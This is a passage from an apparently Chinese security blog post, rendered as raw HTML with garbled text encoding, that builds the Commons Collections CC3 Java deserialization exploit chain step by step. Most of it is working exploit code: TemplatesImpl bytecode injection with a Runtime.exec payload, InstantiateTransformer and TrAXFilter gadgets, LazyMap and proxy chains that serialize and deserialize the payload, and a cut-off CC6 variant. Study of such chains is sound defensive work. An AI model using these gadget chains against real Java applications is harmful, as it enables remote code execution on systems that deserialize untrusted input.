class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†æ‰§è¡Œå°±å¯ä»¥å¼¹è®¡ç®—å™¨äº†ï¼š</p><p><img src="/img/cc308.png" alt="cc308"></p><p>åé¢å°±å¾ˆå¥½ç†è§£äº†ï¼šç°åœ¨è°ƒ<code>newTransformer()</code>è¿™æ¡è·¯èµ°å¾—é€šï¼Œè€Œä¸”<code>newTransformer()</code>è¿˜æ˜¯ä¸ª<code>public</code>æ–¹æ³•ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>CC1</code>é‚£è¾¹çš„<code>chainedTransformer</code>æ›¿æ¢ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1TemplatesEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">// templates.newTransformer();  </span><br>  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> chainedTransformer.transform(<span class="hljs-number">1</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>transform</code>é‡Œé¢çš„å‚æ•°æ— æ‰€è°“ï¼Œå› ä¸ºå­˜åœ¨<code>new ConstantTransformer(templates)</code>ã€‚è¯´ç™½äº†å°±æ˜¯<code>templates.newTransformer()</code>ï¼Œæ¢åˆ«çš„æ–¹æ³•ç½¢äº†ã€‚</p><p>è¿™æ¡è·¯æ—¢ç„¶èƒ½èµ°é€šï¼Œå¯ä»¥å°è¯•æŠŠ<code>CC1</code>å‰©ä¸‹çš„éƒ¨åˆ†éƒ½æ”¾è¿›å»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1TemplatesEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">// templates.newTransformer();  </span><br>  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//   chainedTransformer.transform(1);  </span><br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;drunkbaby&quot;</span>);  <br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  <br> <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–  </span><br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><code>ysoser</code>ç‰ˆCC3:</p><p>ä¸Šé¢åˆ†æäº†ï¼Œåªè¦å®ç°è°ƒç”¨<code>templates.newTransformer()</code>å°±èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥æ‰¾éƒ½å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•(è¿™é‡Œæˆ‘å°±ç›´æ¥å»çœ‹<code>TrAXFilter</code>äº†ï¼Œå…·ä½“åŸå› å‚è€ƒ<a href="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/#1-CC3-%E9%93%BE%E5%88%86%E6%9E%90">å‚è€ƒæ–‡ç« </a>)ï¼š</p><p><img src="/img/TrAXFilterCode.png" alt="TrAXFilterCode"></p><p>æ³¨æ„æ„é€ å‡½æ•°ä¸­çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">_templates = templates;<br>_transformer = (TransformerImpl) templates.newTransformer();<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥åªè¦è°ƒäº†è¿™ä¸ªæ„é€ å‡½æ•°å°±èƒ½è¾¾åˆ°ç›®æ ‡</p><p>æœ‰æ²¡æœ‰å“ªä¸ªåœ°æ–¹è°ƒäº†è¿™ä¸ªæ„é€ å‡½æ•°ï¼Ÿ</p><p><code>InstantiateTransformer</code>ä¸‹å­˜åœ¨ï¼š</p><p><img src="/img/InstantiateTransformer.png" alt="InstantiateTransformer"></p><p>å¯ä»¥é€šè¿‡<code>transform</code>è°ƒç”¨æŒ‡å®šæ„é€ å™¨å¹¶æ”¾å…¥æŒ‡å®šå‚æ•°ï¼Œçœ‹ä¸‹è¿™ä¸ªå‚æ•°æ€ä¹ˆå®šä¹‰çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InstantiateTransformer</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> &#123;<br>    <span class="hljs-built_in">super</span>();<br>    iParamTypes = paramTypes;<br>    iArgs = args;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç°åœ¨çš„é€»è¾‘ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">éœ€è¦å®ç°ï¼štemplates.newTransformer<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span><br>TrAXFilterçš„æ„é€ å‡½æ•°è°ƒç”¨äº†templates.newTransformer<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span><br>InstantiateTransformer.transformå¯ä»¥è¿›è¡Œæ„é€ æ–¹æ³•è°ƒç”¨<br>(æ‰€ä»¥è¿™é‡Œåˆå›åˆ°äº†transformæ–¹æ³•çš„è°ƒç”¨)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼ å…¥ <code>new Class[]&#123;Templates.class&#125;</code> ä¸ <code>new Object[]&#123;templates&#125;</code> å³å¯ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬æŠŠå‰é¢çš„<code>templates.newTransformer()</code>æ›¿æ¢ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> instantiateTransformer.transform(TrAXFilter.class);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/cc307.png" alt="cc307"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆå›åˆ°äº†<code>transform</code>æ–¹æ³•çš„è°ƒç”¨ã€‚ã€‚ç›´æ¥æŠŠä»–å’Œ<code>CC1</code>çš„æ‹¼ä¸€ä¸‹ï¼š</p><p>å…¶å®å°±æ˜¯æŠŠ<code> instantiateTransformer.transform(TrAXFilter.class);</code>æ¢æ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// CC3 é“¾æœ€ç»ˆ EXPpublic class CC3FinalEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception  <br>    &#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,   <span class="hljs-comment">//æ³¨æ„è¿™é‡Œ</span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  <br>  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  <br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  <br>  <br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿèƒ½å’Œ<code>CC6ç»“åˆ</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> 